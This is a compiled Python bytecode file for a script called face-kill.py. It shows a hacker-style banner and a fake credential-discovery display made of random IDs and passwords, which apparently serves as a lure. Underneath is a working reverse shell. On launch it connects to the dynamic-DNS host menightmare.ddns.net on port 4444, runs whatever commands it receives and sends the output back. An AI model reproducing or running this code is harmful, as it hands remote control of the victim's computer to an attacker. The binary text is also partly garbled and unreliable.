�
    z�of�  �                   ��   � d dl Z d dlZd dlZd dlZd dlZdZd� Zd� Zd� Zdd�Z	d� Z
d	� Z ed
�  �        ZdZ e�   �           ee�  �          e
�   �           edd�  �         dS )�    Na�  
  ______    _______  _______  _______  __   __  ___   ___      _______  __    _  __   __  __   __ 
 /  __  \  |       ||   _   ||       ||  | |  ||   | |   |    |       ||  |  | ||  | |  ||  | |  |
|  |  |  | |   _   ||  |_|  ||_     _||  |_|  ||   | |   |    |    ___||   |_| ||  |_|  ||  | |  |
|  |  |  | |  | |  ||       |  |   |  |       ||   | |   |    |   |___ |       ||       ||  |_|  |
|  |  |  | |  |_|  ||       |  |   |  |       ||   | |   |___ |    ___||  _    ||       ||       |
|  |__|  | |       ||   _   |  |   |  |   _   ||   | |       ||   |___ | | |   ||   _   ||       |
 \______/  |_______||__| |__|  |___|  |__| |__||___| |_______||_______||_|  |__||__| |__||_______|
c                  �R   � t          j        t           j        dk    rdnd�  �         d S )N�nt�cls�clear)�os�system�name� �    �face-kill.py�clear_screenr      s&   � ��I�r�w�$���e�e�G�4�4�4�4�4r   c                 �0   � t          d| z   dz   �  �         d S )Nz[32mz[0m)�print)�texts    r   �print_hacker_textr      s    � �	�*�t�
�i�
'�(�(�(�(�(r   c                  �T   � d�                     t          j        dd��  �        �  �        S )N� �
0123456789�   ��k��join�random�choicesr
   r   r   �generate_random_idr      s#   � ��7�7�6�>�,�"�5�5�5�6�6�6r   �   c                 �T   � d�                     t          j        d| ��  �        �  �        S )Nr   r   r   r   )�lengths    r   �generate_random_passwordr       s#   � ��7�7�6�>�,�&�9�9�9�:�:�:r   c                  �X  � g d�} | D ](}t          |� d��  �         t          j        d�  �         �)t          d�  �         t          t          �  �        D ]V}t          �   �         }t          �   �         }t          d|� ��  �         t          d|� ��  �         t          j        d�  �         �Wd S )N)zSearching for IDs and passwordszAccessing secure databasezDecrypting password fileszAnalyzing encrypted datazExtracting user credentialsz...�   zIDs and passwords discovered:zID: z
Password: )r   �time�sleep�range�	num_pairsr   r    )�search_phrases�phrase�_�	random_id�random_passwords        r   �simulate_search_and_discoveryr,   #   s�   � �� � �N� !� � ���V�.�.�.�)�)�)��
�1������5�6�6�6��9��� � ��&�(�(�	�2�4�4���,��,�,�-�-�-��8��8�8�9�9�9��
�1������ r   c                 ��  � t          j         t           j        t           j        �  �        }|�                    | |f�  �         	 |�                    d�  �        �                    d�  �        }|�                    �   �         dk    rnd|�                    �   �         dk    rt          �   �          n<t          j	        |�  �        }|�
                    |�                    d�  �        �  �         ��|�                    �   �          d S )NTi   zutf-8�exit�discover)�socket�AF_INET�SOCK_STREAM�connect�recv�decode�lowerr,   �
subprocess�	getoutput�send�encode�close)�	server_ip�server_port�s�command�outputs        r   �reverse_shell_clientrA   7   s�   � ���f�n�f�&8�9�9�A��I�I�y�+�&�'�'�'�+��&�&��,�,�%�%�g�.�.���=�=�?�?�f�$�$���=�=�?�?�j�(�(�)�+�+�+�+��)�'�2�2�F��F�F�6�=�=��)�)�*�*�*�+� �G�G�I�I�I�I�Ir   z&Please enter the path of the ID file: �   zmenightmare.ddns.neti\  )r   )r   r   r0   r7   r#   �face_kill_artr   r   r   r    r,   rA   �input�id_file_pathr&   r
   r   r   �<module>rF      s  �� 	�	�	�	� ���� ���� � � � � ������5� 5� 5�)� )� )�7� 7� 7�;� ;� ;� ;�� � �(� � � �u�=�>�>�� �	� ����� � �-�  �  �  � � � � � �
 � �+�D� 1� 1� 1� 1� 1r   